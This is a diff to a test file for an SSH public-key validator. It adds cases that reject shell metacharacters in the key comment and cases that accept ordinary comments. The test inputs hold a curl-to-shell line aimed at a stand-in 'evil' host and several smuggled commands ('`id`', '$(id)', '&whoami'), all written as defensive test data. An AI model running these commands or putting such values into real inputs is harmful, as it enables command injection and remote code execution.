@@ -30,6 +30,21 @@ describe("isValidSshPublicKey", () => {
     expect(isValidSshPublicKey("ssh-ed25519\nAAAAC3NzaC1lZDI1NTE5")).toBe(false);
   });
 
+  it("rejects shell metacharacters in the comment, which an interpreted file would run", () => {
+    // ~/.ssh/rc is executed by sshd at every login: an appended line whose
+    // comment carries ";" or "|" is a command, whatever the first token was.
+    expect(isValidSshPublicKey(`${ED25519.split(" ").slice(0, 2).join(" ")} ; curl http://evil | sh`)).toBe(false);
+    expect(isValidSshPublicKey("ssh-ed25519 AAAAC3NzaC1lZDI1NTE5 `id`")).toBe(false);
+    expect(isValidSshPublicKey("ssh-ed25519 AAAAC3NzaC1lZDI1NTE5 x&whoami")).toBe(false);
+    expect(isValidSshPublicKey("ssh-ed25519 AAAAC3NzaC1lZDI1NTE5 $(id)")).toBe(false);
+  });
+
+  it("still accepts an ordinary comment", () => {
+    expect(isValidSshPublicKey("ssh-ed25519 AAAAC3NzaC1lZDI1NTE5 user@host")).toBe(true);
+    expect(isValidSshPublicKey("ssh-ed25519 AAAAC3NzaC1lZDI1NTE5 kipavy@work-laptop.local")).toBe(true);
+    expect(isValidSshPublicKey("ssh-ed25519 AAAAC3NzaC1lZDI1NTE5 my key 2026")).toBe(true);
+  });
+
   it("rejects an unknown key type and a non-base64 blob", () => {
     expect(isValidSshPublicKey("ssh-evil AAAAC3NzaC1lZDI1NTE5")).toBe(false);
     expect(isValidSshPublicKey("ssh-ed25519 $(id)")).toBe(false);
